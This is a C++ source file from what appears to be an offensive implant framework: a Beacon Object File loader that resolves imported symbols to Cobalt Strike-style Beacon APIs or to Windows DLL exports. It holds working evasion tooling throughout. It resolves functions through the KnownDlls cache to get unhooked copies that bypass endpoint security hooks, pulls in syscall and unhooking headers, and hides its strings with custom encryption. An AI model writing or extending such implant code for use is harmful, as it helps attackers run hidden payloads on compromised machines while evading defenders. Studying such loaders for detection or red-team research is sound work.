/*
 * beacon_api_resolver.cpp - Beacon API Symbol Resolution
 *
 * Resolves external symbols to either:
 * - Internal Beacon APIs (BeaconPrintf, BeaconDataParse, etc.)
 * - DLL exports via KnownDlls cache (unhooked) with LoadLibrary fallback
 */

#include <windows.h>
#include <stdint.h>
#include <stdbool.h>

#include "../../include/coff/beacon_compatibility.h"
#include "../../include/utils.h"
#include "../../include/syscalls.h"
#include "../../include/unhook.h"
#include "../../libs/bastia/bastia.h"
#include "../../include/coff/coff_loader.h"

void* process_symbol(char* symbolstring) {
    void* functionaddress = NULL;
    char* localfunc = NULL;

    if (__strcmp(symbolstring, lcg_encrypt("___chkstk_ms")) == 0) {
        return (void*)&___chkstk_ms;
    }
    if (__strcmp(symbolstring, lcg_encrypt("__chkstk")) == 0) {
        return (void*)&__chkstk;
    }

    const char* imp_prefix = lcg_encrypt("__imp_");
    size_t imp_prefix_len = __strlen(imp_prefix);

    auto amountOfBeaconFunctions = sizeof(InternalFunctions) / sizeof(InternalFunctionEntry);
    char *funcToCheck = symbolstring + imp_prefix_len;

    {
        for (int tempcounter = 0; tempcounter < amountOfBeaconFunctions ; tempcounter++) {
                if (__strcmp(funcToCheck, InternalFunctions[tempcounter].name) == 0) {
                    return InternalFunctions[tempcounter].func;
                }
        }
    }

    char localcopy[256] = {  };
    char* locallib = NULL;

    __strncpy(localcopy, funcToCheck, sizeof(localcopy) - 1);
    char* dollarSign = __strchr(localcopy, '$');
    if (dollarSign) {
        *dollarSign = '\0';
        locallib = localcopy;
        localfunc = dollarSign + 1;
        char* atSign = __strchr(localfunc, '@');
        if (atSign) *atSign = '\0';
#if defined(_WIN32)
        // Use KnownDlls cache with LoadLibrary fallback
        functionTable* nt = coff_loader_get_nt_func_table();
        if (nt) {
            functionaddress = ResolveDllFunction(nt, locallib, localfunc);
            if(functionaddress /*!= null*/) return functionaddress; // Very ugly
        }
        // Fallback
        HMODULE llHandle = __LoadLibraryA(locallib);
		if (llHandle) {
			functionaddress = (PVOID)__GetProcAddress(llHandle, localfunc);
		}
#endif
        }
    return functionaddress;
}

bool initBOFEngineTable(functionTable* nt) {
    return coff_loader_set_nt_func_table(nt);
}
